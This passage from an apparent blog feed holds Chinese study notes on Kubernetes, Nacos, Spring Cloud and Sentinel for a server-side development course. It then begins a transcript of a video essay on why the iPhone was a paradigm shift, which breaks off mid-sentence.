href="#通过-curl-工具来访问-k8s-服务">¶</a>通过 curl 工具来访问 k8s 服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -i -t --rm=true mycurl --image=curlimages/curl:latest --restart=Never --command --sh # 不在幻灯片上，但是强调过</span><br></pre></td></tr></table></figure><h3 id="Label、service-和-pod-之间的关系"><a class="header-anchor" href="#Label、service-和-pod-之间的关系">¶</a>Label、service 和 pod 之间的关系</h3><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230407183121777.png" alt></p><h3 id="Deployment"><a class="header-anchor" href="#Deployment">¶</a>Deployment</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl create deployment myspittr --image=spittr:1.0-SNAPSHOT --port=8080</span><br><span class="line">kubectl expose deployment myspittr 把上面的这个pod的8080端口暴露为myspittr服务</span><br><span class="line">kubectl create ingress myspittr --class=nginx --rule=www.demo.com/*=myspittr:8080</span><br></pre></td></tr></table></figure><p>create Deployment —&gt; expose Deployment（暴露成service） —&gt; create ingress</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">set</span> image deployment/spittr spittr=spittr:1.0</span><br><span class="line">kubectl edit deployment/nginx-deployment</span><br><span class="line">kubectl autoscale deployment spittr --min=10 --max=15 --cpu-percent=80</span><br></pre></td></tr></table></figure><blockquote><p>deployment、service、ingress</p><p>Deployment、Service和Ingress都是Kubernetes中的重要概念。Deployment是一种资源对象，用于管理Pod和ReplicaSet。Service是一种抽象，用于定义一组Pod的访问方式。Ingress是一种资源对象，在Service之上的一层抽象，用于管理外部访问集群内部服务的路由规则。</p><p>在Kubernetes中，Pod是最小的可部署单元，而Service是一种抽象，用于定义一组Pod及其访问方式。Service通过selector和Pod建立关联，根据Service关联到Pod的podIP信息组合成一个endpoint。当Service被创建时，endpoint controller会自动创建endpoint。Service定义了一个服务的访问入口地址，前端的应用通过这个入口地址访问其背后的一组由Pod副本组成的集群实例，来自外部的访问请求被负载均衡到后端的各个容器应用上。</p></blockquote><p>k8s secret是Kubernetes中的一个资源类型，用于保存小片敏感数据，例如密码、token或密钥。Secrets可以被挂载到Pod的容器中，以便容器可以访问这些敏感数据</p><p><code>kubectl get secrets/pods/all [ -n namespace]</code></p><p>kubectl get secrets用于获取secrets列表，kubectl get pods用于获取pods列表，kubectl get all用于获取所有资源的列表。-n选项用于指定命名空间。</p><p><code>kubectl get secret mysecret -o yaml</code></p><p>获取名为mysecret 的secret的yaml格式</p><p><code>kubectl describe secret mysecret</code></p><p>获取mysecret的secret的详细信息</p><p><code>kubectl svc</code></p><p>获取当前集群中的所有service</p><h3 id="k8s-和-nacos-服务的异同点【可能考简答】"><a class="header-anchor" href="#k8s-和-nacos-服务的异同点【可能考简答】">¶</a>k8s 和 nacos 服务的异同点【可能考简答】</h3><blockquote><p>从第 14 次视频 1:49:50 开始。</p></blockquote><p>TODO</p><p>共同点：</p><ol><li>通过服务名访问多个服务；</li><li>一个服务背后可能有多个服务实例；</li><li>通过 Pod 来体现；</li><li>服务实例是动态的，客户只需要知道服务名即可</li></ol><p>k8s和nacos都是服务注册和发现的工具，但是它们的实现方式不同。k8s使用etcd作为服务注册和发现的工具，而nacos则使用自己的服务注册和发现机制。此外，k8s还提供了更多的功能，如容器编排、负载均衡等，而nacos则更加注重服务治理方面的功能。如果您需要更多的容器编排功能，那么k8s可能是更好的选择；如果您需要更多的服务治理功能，那么nacos可能是更好的选择。</p><h2 id="REST-服务、微服务开发与部署"><a class="header-anchor" href="#REST-服务、微服务开发与部署">¶</a>REST 服务、微服务开发与部署</h2><h3 id="微服务架构模式的特征"><a class="header-anchor" href="#微服务架构模式的特征">¶</a>**微服务架构模式的特征</h3><blockquote><p>参考《Spring 微服务实战（第 2 版）》1.1.3 节。</p><p>吸毒请多开</p></blockquote><ol><li>应用程序分解为具有明确定义了职责范围的细粒度组件</li><li>完全独立部署，独立测试，并可复用</li><li>使用轻量级通信协议 HTTP 和 JSON ，松耦合</li><li>服务实现可使用多种编程语言和技术</li><li>将大型团队划分成多个小型开发团队，每个团队只负责他们各自的服务</li></ol><h3 id="Rest原则"><a class="header-anchor" href="#Rest原则">¶</a>Rest原则</h3><p>Representational State Transfer，表现层状态转移</p><ul><li><p>资源（Resources），就是网络上的一个实体，标识：URI</p></li><li><p>表现层（Representation）：json、xml、html、pdf、excel</p></li><li><p>状态转移（State Transfer）：服务端–客户端</p></li><li><p>HTTP协议的四个操作方式的动词：GET、POST、PUT、DELETE</p><p>CRUD：Create、Read、Update、Delete</p></li></ul><p>如果一个架构符合REST原则，就称它为RESTful架构。</p><h3 id="响应头与响应体"><a class="header-anchor" href="#响应头与响应体">¶</a>响应头与响应体</h3><p>状态行：由 HTTP 协议版本、状态码、状态码描述三部分构成，它们之间由空格隔开。</p><p><strong>状态码</strong>：由 3 位数字组成，第一位标识响应的类型，常用的 5 大类状态码如下：</p><ul><li>1xx ：表示服务器已接收了客户端的请求，客户端可以继续发送请求</li><li>2xx ：表示服务器已成功接收到请求并进行处理</li><li>3xx ：表示服务器要求客户端重定向</li><li>4xx ：表示客户端的请求有非法内容</li><li>5xx ：标识服务器未能正常处理客户端的请求而出现意外错误</li></ul><p>响应头：</p><ul><li>Location ：服务器返回给客户端，用于重定向到新的位置</li><li>Server 包含服务器用来处理请求的软件信息及版本信息 Vary ：标识不可缓存的请求头列表</li><li>Connection: 连接方式， close 是告诉服务端，断开连接，不用等待后续的请求了。 keep alive 则是告诉服务端，在完成本次请求的响应后，保持连接</li><li>Keep Alive: 300 ，期望服务端保持连接多长时间（秒）</li></ul><p>响应内容：服务端返回给请求端的文本信息。</p><h3 id="消息转换器-Message-conversion"><a class="header-anchor" href="#消息转换器-Message-conversion">¶</a>消息转换器 Message conversion</h3><ul><li><strong>使用方法级注解 <code>@ResponseBody</code> 或类级 <code>@RestController</code> 作用：指定使用消息转换器，把 Java 对象转化成 json 文件</strong></li><li>没有 model 和视图 控制器产生数据 然后消息转换器转换数据之后的资源表述 。</li><li>spring 自动注册一些消息转换器 HttpMethodConverter 不过类路径下要有对应转换能力的库 如： Jackson Json processor 、 JAXB 库</li><li><strong>请求传入，方法级注解 <code>@RequestBody</code> 以及 HttpMethodConverter，把来自客户端的 json 数据转化成 java 对象</strong>。</li></ul><h3 id="示例代码"><a class="header-anchor" href="#示例代码">¶</a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span> <span class="comment">// 入口类</span></span><br><span class="line"><span class="meta">@Configuration</span> <span class="comment">// 配置类</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br></pre></td></tr></table></figure><p>健康检查：加了 <code>actuator</code>依赖后可以获得更多端点，如 <code>health</code>。</p><h3 id="运维实践"><a class="header-anchor" href="#运维实践">¶</a>**运维实践</h3><p>&quot;库号分不无横&quot;哭嚎分布吴恒</p><ul><li>功能代码和测试脚本等都在源代码库中</li><li>指定 JAR 依赖的版本号</li><li>配置数据与源代码分开放，配置当中有很多常变化的、敏感的信息</li><li>已构建的服务是不可变的，不能再被修改</li><li>微服务应该是无状态的</li><li>并发，通过启动更多的微服务实例横向扩展，多线程是纵向扩展</li></ul><h2 id="基于-NACOS-的数据配置"><a class="header-anchor" href="#基于-NACOS-的数据配置">¶</a>基于 NACOS 的数据配置</h2><blockquote><p>从第 14 次视频 2:04:17 开始。</p></blockquote><h3 id="配置"><a class="header-anchor" href="#配置">¶</a>配置</h3><h4 id="pom-配置"><a class="header-anchor" href="#pom-配置">¶</a>pom 配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="yml-配置"><a class="header-anchor" href="#yml-配置">¶</a>yml 配置</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bootstrap.yml</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">application:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">licensingservice</span> <span class="comment"># 服务名，用来组合 dataId</span></span><br><span class="line">    <span class="attr">profiles:</span></span><br><span class="line">        <span class="attr">active:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="attr">server-addr:</span> <span class="string">nacos-headless:8848</span> <span class="comment"># 访问地址</span></span><br><span class="line">                <span class="attr">file-extension:</span> <span class="string">yml</span> <span class="comment"># 文件后缀</span></span><br></pre></td></tr></table></figure><h4 id="代码注解"><a class="header-anchor" href="#代码注解">¶</a>代码注解</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RefreshScope</span> <span class="comment">// nacos 变更后微服务可以及时获取最新数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;example.property&#125;&quot;)</span> <span class="comment">// 指定 key 名，从 nacos 获得属性值</span></span><br><span class="line">    <span class="keyword">private</span> String exampleProperty;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getExampleProperty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> exampleProperty;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dataId-的完整格式"><a class="header-anchor" href="#dataId-的完整格式">¶</a>**dataId 的完整格式</h3><p><code>$&#123;prefix&#125;-$&#123;spring.profiles.active&#125;.$&#123;file-extension&#125;</code></p><ul><li><code>prefix</code> 默认为 <code>spring.application.name</code> 的值，也可以通过配置项 <code>spring.cloud.nacos.config.prefix</code> 来配置 <code>spring.profiles.active</code> 即为当前环境对应的 <code>profile</code>。</li><li><code>file-exetension</code> 为配置内容的数据格式，可以通过配置项 <code>spring.cloud.nacos.config.file-extension</code> 来配置。 目前只支持 <code>properties</code> 和 <code>yaml</code> 类型。</li></ul><h2 id="基于-NACOS-的服务注册与发现"><a class="header-anchor" href="#基于-NACOS-的服务注册与发现">¶</a>基于 NACOS 的服务注册与发现</h2><blockquote><p>从第 14 次视频 2:10:16 开始。</p></blockquote><h3 id="测试-配置数据更新获取"><a class="header-anchor" href="#测试-配置数据更新获取">¶</a>测试-配置数据更新获取</h3><ul><li><p>curl -X POST “<a href="http://www.nacos.com/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld">http://www.nacos.com/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld</a>”</p></li><li><p>curl -X GET “<a href="http://www.nacos.com/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test">http://www.nacos.com/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test</a>”</p></li></ul><h4 id="在pod中测试"><a class="header-anchor" href="#在pod中测试">¶</a>**在pod中测试</h4><p>kubectl run -i -t --rm=true mycurl --image=curlimages/curl:latest --restart=Never --command – sh</p><p>curl -X POST “<a href="http://nacos-headless:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld">http://nacos-headless:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld</a>”</p><p>curl -X GET “<a href="http://nacos-headless:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test">http://nacos-headless:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test</a>”</p><p>可以使用服务名，服务所在容器IP，所在pod的IP访问，不可以使用pod名访问</p><h3 id="Spring-Cloud项目使用nacos基本流程"><a class="header-anchor" href="#Spring-Cloud项目使用nacos基本流程">¶</a>Spring Cloud项目使用nacos基本流程</h3><ol><li><p>pom加入依赖</p></li><li><p>bootstrap.properties中，一些字段</p><ul><li><p><a href="http://spring.cloud.nacos.config.server.addr:80=www.nacos.com">spring.cloud.nacos.config.server.addr:80=www.nacos.com</a></p></li><li><p>spring.application.name=example</p></li><li><p>spring.cloud.nacos.config.file-extension=properties</p></li></ul></li><li><p>在代码中加入@Value(“${a=1}”), @RefreshScope注解</p></li><li><p>容器配置文件中可设置<code>-name: &quot;PROFILE value: &quot;default&quot;</code>，使得可以对应不同的dataId</p></li></ol><h3 id="服务发现的好处"><a class="header-anchor" href="#服务发现的好处">¶</a>**服务发现的好处</h3><ol><li>快速水平伸缩，而不是垂直伸缩。不影响客户端</li><li>提高应用程序的弹性</li></ol><h3 id="Spring-Cloud-Alibaba"><a class="header-anchor" href="#Spring-Cloud-Alibaba">¶</a>Spring Cloud Alibaba</h3><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/12-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E5%9F%BA%E4%BA%8ENACOS%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%8E%E5%8F%91%E7%8E%B0.jpg" alt></p><h3 id="使用到的-starter-依赖"><a class="header-anchor" href="#使用到的-starter-依赖">¶</a>使用到的 starter 依赖</h3><ul><li>服务配置： <code>com.alibaba.cloud, spring-cloud-starter-alibaba-nacos-config</code></li><li>服务注册： <code>com.alibaba.cloud, spring-cloud-starter-alibaba-nacos-discovery</code></li><li>客户端负载均衡： <code>org.springframework.cloud, spring-cloud-starter-loadbalancer</code></li><li>简化客户端调用： <code>org.springframework.cloud, spring-cloud-starter-openfeign</code></li></ul><h3 id="调用服务的三种方式"><a class="header-anchor" href="#调用服务的三种方式">¶</a>**调用服务的三种方式</h3><ol><li>Spring DiscoveryClient</li><li>使用支持 LoadBalanced 的 RestTemplate</li><li>使用 OpenFeign （@FeignClient）：OpenFeign 是一款声明式、模板化的 HTTP 客户端， Feign 可以帮助我们更快捷、优雅地调用 HTTP API</li></ol><p>后两种方法自动做负载均衡，因此一般不建议使用第一种（只在测试时使用），更常见的是第三种。我们定义的负载平衡策略（轮询、随机等）能影响到后两种方式。</p><h3 id="健康检查"><a class="header-anchor" href="#健康检查">¶</a>健康检查</h3><ul><li>临时实例的客户端主动上报机制， 临时实例每隔 5s 发送一个心跳包给 Nacos 服务器端<ul><li>学习参考（源码剖析）：<a href="https://zhuanlan.zhihu.com/p/386647120">https://zhuanlan.zhihu.com/p/386647120</a></li><li>客户端调用如何应对服务状态不能及时更新，请参考学习：<a href="https://mp.weixin.qq.com/s/fDtcQD1EL-NgVV1BMiPx4g">https://mp.weixin.qq.com/s/fDtcQD1EL-NgVV1BMiPx4g</a></li></ul></li><li>永久实例的服务端反向探测机制，永久实例支持 3 种探测协议，TCP、HTTP 和 MySQL，默认探测协议为 TCP，也就是通过不断 ping 的方式来判断实例是否健康 。</li><li>两种健康检查机制的学习参考：<a href="https://zhuanlan.zhihu.com/p/473494621">https://zhuanlan.zhihu.com/p/473494621</a></li></ul><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230408100516865.png" alt></p><h3 id="服务部署"><a class="header-anchor" href="#服务部署">¶</a>服务部署</h3><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230408100719812.png" alt></p><p>由 A（licensingservice） 到 B（organizationservice） ，需要获得 B 的 IP 地址和端口号。</p><ul><li>不是 A 先把请求发给 Nacos，由 Nacos 进行转发；</li><li>而是从 Nacos 获得 IP 地址，再直接和 B 进行通信。</li></ul><h3 id="如何基于-NACOS-实现服务注册与发现"><a class="header-anchor" href="#如何基于-NACOS-实现服务注册与发现">¶</a>如何基于 NACOS 实现服务注册与发现</h3><h4 id="添加依赖"><a class="header-anchor" href="#添加依赖">¶</a>添加依赖</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;</span><br><span class="line">    &lt;!--            &lt;exclusions&gt;--&gt;</span><br><span class="line">    &lt;!--                &lt;exclusion&gt;--&gt;</span><br><span class="line">    &lt;!--                    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;--&gt;</span><br><span class="line">    &lt;!--                    &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt;--&gt;</span><br><span class="line">    &lt;!--                &lt;/exclusion&gt;--&gt;</span><br><span class="line">    &lt;!--            &lt;/exclusions&gt;--&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-loadbalancer&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="定义访问地址"><a class="header-anchor" href="#定义访问地址">¶</a>定义访问地址</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">application:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">licensingservice</span></span><br><span class="line">    <span class="attr">profiles:</span></span><br><span class="line">        <span class="attr">active:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="attr">server-addr:</span> <span class="string">nacos-headless:8848</span></span><br><span class="line">                <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">            <span class="attr">discovery:</span></span><br><span class="line">                <span class="attr">server-addr:</span> <span class="string">nacos-headless:8848</span> <span class="comment"># nacos 访问地址</span></span><br></pre></td></tr></table></figure><h4 id="启动类注解"><a class="header-anchor" href="#启动类注解">¶</a>启动类注解</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FeignClient(&quot;organizationservice&quot;)</span> <span class="comment">// 注解值就是服务名</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrganizationFeignClient</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">            method = RequestMethod.GET,</span></span><br><span class="line"><span class="meta">            value = &quot;/v1/organizations/&#123;organizationId&#125;&quot;,</span></span><br><span class="line"><span class="meta">            consumes = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="function">Organization <span class="title">getOrganization</span><span class="params">(<span class="meta">@PathVariable(&quot;organizationId&quot;)</span> String organizationId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LicenseService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    ServiceConfig config;</span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">// 注入使用的服务</span></span><br><span class="line">    OrganizationFeignClient organizationFeignClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    OrganizationRestTemplateClient organizationRestClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    OrganizationDiscoveryClient organizationDiscoveryClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LicenseRepository licenseRepository;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于-Sentinel-的流控与熔断"><a class="header-anchor" href="#基于-Sentinel-的流控与熔断">¶</a>基于 Sentinel 的流控与熔断</h2><blockquote><p>从第 14 次视频 2:20:30 开始。</p></blockquote><p>Sentinel 是面向分布式、多语言异构化服务架构的流量治理组件，主要以流量为切入点，从流量路由、流量控制、流量整形、熔断降级、系统自适应过载保护、热点流量防护等多个维度来帮助开发者保障微服务的稳定性。</p><h3 id="Sentinel-组成"><a class="header-anchor" href="#Sentinel-组成">¶</a>Sentinel 组成</h3><ul><li>核心库（Java 客户端）：不依赖任何框架/库，能够运行于 Java 8 及以上的版本的运行时环境，同时对 Dubbo/Spring Cloud 等框架也有较好的支持</li><li>控制台（Dashboard Dashboard）：主要负责管理推送规则、监控、管理机器信息等</li></ul><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230408102029273.png" alt></p><p>控制台不维护规则，通过端口号 8719 查询规则，如果服务故障则规则丢失。</p><h3 id="定义资源的方式"><a class="header-anchor" href="#定义资源的方式">¶</a>定义资源的方式</h3><ol><li>代码直接定义</li><li>使用注解定义</li><li>Spring Cloud 针对 URL 自动定义</li></ol><p>强调：外置文件只能用来定义规则，不能用来定义资源</p><h3 id="规则的种类"><a class="header-anchor" href="#规则的种类">¶</a>规则的种类</h3><ol><li>流量控制规则</li><li>熔断降级规则</li><li>系统保护规则</li><li>来源访问控制规则</li><li>热点参数规则</li></ol><h3 id="熔断策略"><a class="header-anchor" href="#熔断策略">¶</a>熔断策略</h3><ol><li>慢调用比例</li><li>异常比例</li><li>异常数绝对值</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/03/02/%E9%9A%8F%E7%AC%94-%E5%9B%9B%E4%B8%AA%E4%B8%96%E7%95%8C/"/>
      <url>/2023/03/02/%E9%9A%8F%E7%AC%94-%E5%9B%9B%E4%B8%AA%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<p>哈喽大家好我是老蒋，这期视频呢不太一样，我准备绕一个巨大的圈子，用一个巨大的利润框架，用一种很复杂的很困难的方式，去聊一聊最近20年来，移动互联网给人类生活，带来的深层次的改变，聊一聊，我们所处的精神困境和解决方案，</p><p>这期视频呢，会有很多前置的概念和前置的论述，希望你们能享受这个过程，</p><p>所有人都知道iPhone很厉害对吧，07年的iPhone初代，这个发布会，可能是人类科技史上，最伟大的发布会之一，最震撼的发布会之一，iPhone初代也是人类历史上最伟大的，至少是商业领域的科技产品之一，那么我现在下面来问一个听上去，傻瓜的问题，就是iPhone为什么是革命性的终端产品，它好在哪儿，</p><p>屏幕前面的很多观众，我相信都没有经历过那一个时代，那个时候你们可能太小 ，我当时大概19岁，20岁我在上这个大学，那么我猜你们有人会说，iPhone厉害是因为iPhone的功能强大，但是这是一个非常典型的误解，实际上在2007年的时候，iPhone在功能上，并没有对同时期的这个手机，形成很大的优势，</p><p>iPhone发布会之后，当时美国有一个老牌的生活杂志，叫做这个，popular science，然后呢他写了篇文章叫iPhone VS Nokia N95，里面给出了15个维度的对比，其中9个维度是N95赢了，游戏体验拍照拨打电话，操作系统等等等等，9个维度N95更厉害，iPhone呢只赢了四个维度，是在这个外观设计，音乐播放，网页浏览，价格上面他赢了，两个维度打了平手，那这篇文章最后结论就是，popular science的编辑会选择N95作为他的手机，在我的印象里其实也差不多 ，就是iPhone在当年，在功能上并没有碾压同时代的这个旗舰机，尤其是像诺基亚N95这样的，诺基亚的旗舰机，</p><p>但是因为历史是由胜利者书写的，所以现在的小孩可能会觉得，这个iPhone 这个iPhone最终是胜利者，那么现在我们带着滤镜回过头去看，好像iPhone当年什么什么都领先，然后其他的同时带的手机，都是垃圾。 其实不是，实际上完全成熟体的这个Symbian系统，当年是非常强大的，像现在手机的一些功能，拍照上网，电子邮件，GPS定位这些功能全都能实现，那么在实打实的功能上面，iPhone是没有太大优势的，所以说iPhone真正厉害在哪这个问题，并不是那些所谓的硬功能，让iPhone成为了一个最具时代革命性的手机，</p><p>（1000字标记）</p><p>我认为iPhone这个智能手机的出现，其实是一次范式革命，那么 范式革命这个概念是比较难以展开的，我这期视频出于篇幅的考虑不展开 ，有机会可能专门出一期视频，说一说这个事，反正就是大家可以理解成，如果在某一个领域里面，有一群人率先用完全不一样的，之前没有人试过的视角，还有方式，去解释这个领域里发生的现象，或者说在这个领域里进行生产活动，那么这就是一次 范式革命，</p><p>那么为什么我说iPhone是一场 范式革命，智能手机是一场范式革命，因为iPhone，真正有别于此前手机的地方有两个，那么第一个是它有更多的sensor，更多传感器，所以呢，它能够更细致的感知周边环境，还有这个使用者本身的信息，第二点是它的交互更加直观更加自然，更加符合人体直觉，那么这两点背后又是什么呢，我个人觉得，是设计思路上的巨大的区别，在iPhone之前 ， 